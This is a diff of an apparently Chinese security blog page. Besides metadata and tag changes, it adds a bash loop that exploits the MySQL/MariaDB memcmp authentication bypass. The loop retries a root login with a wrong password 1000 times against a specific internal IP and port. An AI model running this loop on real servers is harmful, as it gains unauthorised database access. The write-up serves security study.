@@ -49,7 +49,7 @@
         content="2022-02-17">
       <meta 
         property="og:article:modified_time" 
-        content="2022-02-17">
+        content="2022-07-21">
       <meta 
         property="og:article:author" 
         content="CBear">
@@ -329,7 +329,7 @@
     
     
       <span class="dot"></span>
-      <span>186 words</span>
+      <span>203 words</span>
     
   </div>
   
@@ -370,6 +370,7 @@
 <blockquote>
 <p>当连接<strong>MariaDB/MySQL</strong>时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是<code>memcmp()</code>返回一个非零值，也会使MySQL认为两个密码是相同的。也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">`</span><span class="token function">seq</span> <span class="token number">1</span> <span class="token number">1000</span><span class="token variable">`</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span> mysql -uroot -pwrong -h <span class="token operator">&lt;</span>sql服务器ip<span class="token operator">></span> -P<span class="token operator">&lt;</span>port<span class="token operator">></span> <span class="token punctuation">;</span> <span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 </blockquote>
+<p>for i in <code>seq 1 1000</code>; do mysql -uroot -pwrong -h 10.101.20.212 -P3306 ; done</p>
 
   </div>
   <div>
@@ -471,7 +472,7 @@
   <a 
     class="author-tags-count" 
     href="/tags">
-    <span>49</span>
+    <span>50</span>
     <span>Tags</span>
   </a>
 </div>
@@ -593,6 +594,12 @@
       </a>
     
       <a 
+        href="/tags/SSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" 
+        title="SSH端口转发">
+        <div class="tags-list-item">SSH端口转发</div>
+      </a>
+    
+      <a 
         href="/tags/Msfvenom/" 
         title="Msfvenom">
         <div class="tags-list-item">Msfvenom</div>
@@ -608,12 +615,6 @@
         href="/tags/DVWA/" 
         title="DVWA">
         <div class="tags-list-item">DVWA</div>
-      </a>
-    
-      <a 
-        href="/tags/SSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" 
-        title="SSH端口转发">
-        <div class="tags-list-item">SSH端口转发</div>
       </a>
     
       <a 
@@ -641,6 +642,18 @@
       </a>
     
       <a 
+        href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" 
+        title="文件上传">
+        <div class="tags-list-item">文件上传</div>
+      </a>
+    
+      <a 
+        href="/tags/redis%E6%95%B0%E6%8D%AE%E5%BA%93/" 
+        title="redis数据库">
+        <div class="tags-list-item">redis数据库</div>
+      </a>
+    
+      <a 
         href="/tags/redis/" 
         title="redis">
         <div class="tags-list-item">redis</div>
@@ -650,18 +663,6 @@
         href="/tags/XSS/" 
         title="XSS">
         <div class="tags-list-item">XSS</div>
-      </a>
-    
-      <a 
-        href="/tags/AES/" 
-        title="AES">
-        <div class="tags-list-item">AES</div>
-      </a>
-    
-      <a 
-        href="/tags/Nacos/" 
-        title="Nacos">
-        <div class="tags-list-item">Nacos</div>
       </a>
     
   </div>
